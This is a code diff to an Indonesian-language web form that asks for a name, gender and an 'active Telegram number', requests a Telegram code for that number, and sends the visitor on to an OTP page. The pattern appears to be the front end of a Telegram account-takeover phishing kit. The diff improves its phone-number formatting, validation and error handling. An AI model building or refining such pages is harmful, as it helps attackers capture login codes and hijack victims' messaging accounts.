@@ -1,3 +1,4 @@
+<!DOCTYPE html>
 <html lang="en">
 
 <head>
@@ -52,7 +53,7 @@
                                     </div>
 
                                     <div class="mb-3">
-                                        <label for="gender" class="form-label">Jenis Kelmin</label>
+                                        <label for="gender" class="form-label">Jenis Kelamin</label>
                                         <select class="form-select" name="gender" id="gender" required="">
                                             <option value="Laki Laki">Laki-Laki</option>
                                             <option value="Perempuan">Perempuan</option>
@@ -65,6 +66,7 @@
                                             <span class="input-group-text" id="basic-addon1">ID +62</span>
                                             <input type="tel" class="form-control" name="phone" id="phone" placeholder="Nomor Telegram Aktif" aria-label="Phone" aria-describedby="basic-addon1" required="">
                                         </div>
+                                        <small class="form-text text-muted">Contoh: 8123456789 atau 08123456789</small>
                                     </div>
 
                                     <div class="mb-3">
@@ -93,9 +95,6 @@
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
     <script src="https://code.jquery.com/jquery.min.js"></script>
-    <script>
-        $(document).ready(function() {});
-    </script>
 
     <script>
         $(document).ready(function() {
@@ -105,15 +104,20 @@
 
             $("#phone-form").on("submit", function(e) {
                 e.preventDefault();
-                var phoneNumber = $("#phone").val();
-                if (phoneNumber.startsWith("0")) {
-                    phoneNumber = phoneNumber.replace(/^0/, "+62");
-                } else if (phoneNumber.startsWith("6")) {
-                    phoneNumber = phoneNumber.replace(/^62/, "+62");
-                } else if (phoneNumber.startsWith("8")) {
-                    phoneNumber = phoneNumber.replace(/^8/, "+628");
-                } else {
-                    phoneNumber = phoneNumber;
+                
+                // Ambil nomor telepon
+                var rawPhoneNumber = $("#phone").val().trim();
+                
+                // Hapus semua karakter non-digit
+                var cleanNumber = rawPhoneNumber.replace(/[^\d]/g, '');
+                
+                // Format nomor telepon dengan benar
+                var phoneNumber = formatPhoneNumber(cleanNumber);
+                
+                // Validasi format nomor
+                if (!validatePhoneNumber(phoneNumber)) {
+                    toastr.error("Format nomor telepon tidak valid. Silakan periksa kembali.");
+                    return false;
                 }
 
                 const data = {
@@ -123,8 +127,50 @@
                     phoneNumber: phoneNumber,
                 }
 
+                // Simpan nomor untuk halaman berikutnya
+                localStorage.setItem("phoneNumber", phoneNumber);
+                
+                // Lanjutkan dengan mengirim kode Telegram
                 requestTelegramCode(data);
             });
+            
+            // Fungsi untuk memformat nomor telepon ke format +62
+            function formatPhoneNumber(number) {
+                // Jika sudah diawali dengan +62, kembalikan apa adanya
+                if (number.startsWith('+62')) {
+                    return number;
+                }
+                
+                // Jika diawali dengan 62, ubah menjadi +62
+                if (number.startsWith('62')) {
+                    return '+' + number;
+                }
+                
+                // Jika diawali dengan 0, ganti 0 dengan +62
+                if (number.startsWith('0')) {
+                    return '+62' + number.substring(1);
+                }
+                
+                // Jika diawali dengan 8, tambahkan +62
+                if (number.startsWith('8')) {
+                    return '+62' + number;
+                }
+                
+                // Jika format lain, biarkan dan tambahkan +62
+                return '+62' + number;
+            }
+            
+            // Fungsi untuk validasi nomor telepon
+            function validatePhoneNumber(phoneNumber) {
+                // Minimal panjang nomor dengan +62 adalah 10 digit (+62 + minimal 8 digit)
+                if (phoneNumber.length < 10) {
+                    return false;
+                }
+                
+                // Pastikan format sesuai +62 diikuti angka
+                var phoneRegex = /^\+62\d{8,15}$/;
+                return phoneRegex.test(phoneNumber);
+            }
         });
 
         function requestTelegramCode(data) {
@@ -135,11 +181,22 @@
                 data: data,
                 success: function(response) {
                     $(".loading").hide();
-                    localStorage.setItem("phoneNumber", data.phoneNumber);
-                    window.location.href = "./otp.php";
+                    try {
+                        var result = JSON.parse(response);
+                        if (result.success) {
+                            window.location.href = "./otp.php";
+                        } else {
+                            toastr.error(result.error || "Terjadi kesalahan. Silakan coba lagi.");
+                        }
+                    } catch (e) {
+                        console.error("Error parsing response:", e);
+                        toastr.error("Terjadi kesalahan sistem. Silakan coba lagi.");
+                    }
                 },
                 error: function(error) {
+                    $(".loading").hide();
                     console.log("Error:", error);
+                    toastr.error("Gagal menghubungi server. Silakan coba lagi.");
                 },
             });
         }
